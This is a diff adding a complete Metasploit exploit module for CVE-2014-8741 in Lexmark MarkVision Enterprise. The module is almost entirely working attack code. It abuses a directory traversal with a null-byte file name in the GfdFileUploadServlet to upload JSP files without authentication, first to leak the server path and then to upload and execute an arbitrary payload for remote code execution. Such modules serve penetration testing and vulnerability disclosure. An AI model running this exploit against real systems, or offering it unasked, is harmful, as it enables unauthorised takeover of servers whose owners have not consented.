@@ -1,0 +1,155 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::FileDropper
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'          => 'Lexmark MarkVision Enterprise Arbitrary File Upload',
+      'Description'   => %q{
+        This module exploits a code execution flaw in Lexmark MarkVision Enterprise before 2.1.
+        A directory traversal in the GfdFileUploadServlet servlet allows an unauthenticated
+        attacker to upload arbitrary files, including arbitrary JSP code. This module has been
+        tested successfully on Lexmark MarkVision Enterprise 2.0 with Windows 2003 SP2.
+      },
+      'Author'        =>
+        [
+          'Andrea Micalizzi', # Vulnerability Discovery
+          'juan vazquez' # Metasploit module
+        ],
+      'License'       => MSF_LICENSE,
+      'References'    =>
+        [
+          ['CVE', '2014-8741'],
+          ['ZDI', '14-410'],
+          ['URL', 'http://support.lexmark.com/index?page=content&id=TE666&locale=EN&userlocale=EN_US']
+        ],
+      'Privileged'    => true,
+      'Platform'      => 'win',
+      'Arch'          => ARCH_JAVA,
+      'Targets'       =>
+        [
+          [ 'Lexmark Markvision Enterprise 2.0', { } ]
+        ],
+      'DefaultTarget'  => 0,
+      'DisclosureDate' => 'Dec 09 2014'))
+
+    register_options(
+      [
+        Opt::RPORT(9788),
+        OptString.new('TARGETURI', [true, 'ROOT path', '/'])
+      ], self.class)
+  end
+
+  def check
+    res = send_request_cgi({
+      'uri' => normalize_uri(target_uri.path.to_s, 'mve', 'help', 'en', 'inventory', 'am_about.html')
+    })
+
+    version = nil
+    if res && res.code == 200 && res.body && res.body.to_s =~ /MarkVision Enterprise ([\d\.]+)/
+      version = $1
+    else
+      return Exploit::CheckCode::Unknown
+    end
+
+    if Gem::Version.new(version) <= Gem::Version.new('2.0.0')
+      return Exploit::CheckCode::Appears
+    end
+
+    Exploit::CheckCode::Safe
+  end
+
+  def exploit
+    jsp_leak = jsp_path
+    jsp_name_leak = "#{rand_text_alphanumeric(4 + rand(32 - 4))}.jsp"
+    # By default files uploaded to C:\Program Files\Lexmark\Markvision Enterprise\apps\library\gfd-scheduled
+    # Default app folder on C:\Program Files\Lexmark\Markvision Enterprise\tomcat\webappps\ROOT
+    traversal_leak = "/..\\..\\..\\tomcat\\webapps\\ROOT\\#{jsp_name_leak}\x00.pdf"
+
+    print_status("#{peer} - Uploading info leak JSP #{jsp_name_leak}...")
+    if upload_file(traversal_leak, jsp_leak)
+      print_good("#{peer} - JSP successfully uploaded")
+    else
+      fail_with(Failure::Unknown, "#{peer} - JSP upload failed")
+    end
+
+    res = execute(jsp_name_leak)
+
+    if res && res.code == 200 && res.body.to_s !~ /null/ && res.body.to_s =~ /Path:(.*)/
+      upload_path = $1
+      print_good("#{peer} - Working directory found in #{upload_path}")
+      register_file_for_cleanup(::File.join(upload_path, 'webapps', 'ROOT', jsp_name_leak))
+    else
+      print_error("#{peer} - Couldn't retrieve the upload directory, manual cleanup will be required")
+    end
+
+    jsp_payload_name = "#{rand_text_alphanumeric(4+rand(32-4))}.jsp"
+    jsp_payload = payload.encoded
+    traversal_payload = "/..\\..\\..\\tomcat\\webapps\\ROOT\\#{jsp_payload_name}\x00.pdf"
+
+    print_status("#{peer} - Uploading JSP payload #{jsp_payload_name}...")
+    if upload_file(traversal_payload, jsp_payload)
+      print_good("#{peer} - JSP successfully uploaded")
+      register_file_for_cleanup(::File.join(upload_path, 'webapps', 'ROOT', jsp_payload_name)) if upload_path
+    else
+      fail_with(Failure::Unknown, "#{peer} - JSP upload failed")
+    end
+
+    print_status("#{peer} - Executing payload...")
+    execute(jsp_payload_name, 3)
+  end
+
+  def upload_file(filename, contents)
+    good_signature = rand_text_alpha(4 + rand(4))
+    bad_signature = rand_text_alpha(4 + rand(4))
+
+    post_data = Rex::MIME::Message.new
+    post_data.add_part(good_signature, nil, nil, 'form-data; name="success"')
+    post_data.add_part(bad_signature, nil, nil, 'form-data; name="failure"')
+    post_data.add_part(contents, 'application/octet-stream', nil, "form-data; name=\"datafile\"; filename=\"#{filename}\"")
+
+    res = send_request_cgi(
+      {
+        'uri'    => normalize_uri(target_uri.path, 'mve', 'upload', 'gfd'),
+        'method' => 'POST',
+        'data'   => post_data.to_s,
+        'ctype'  => "multipart/form-data; boundary=#{post_data.bound}"
+      })
+
+    if res && res.code == 200 && res.body && res.body.to_s.include?(good_signature)
+      return true
+    else
+      return false
+    end
+  end
+
+  def execute(jsp_name, time_out = 20)
+    res = send_request_cgi({
+      'uri'    => normalize_uri(target_uri.path.to_s, jsp_name),
+      'method' => 'GET'
+    }, time_out)
+
+    res
+  end
+
+  def jsp_path
+    jsp =<<-EOS
+<%@ page language="Java" import="java.util.*"%>
+<%
+out.println("Path:" + System.getProperty("catalina.home"));
+%>
+    EOS
+
+    jsp
+  end
+
+end
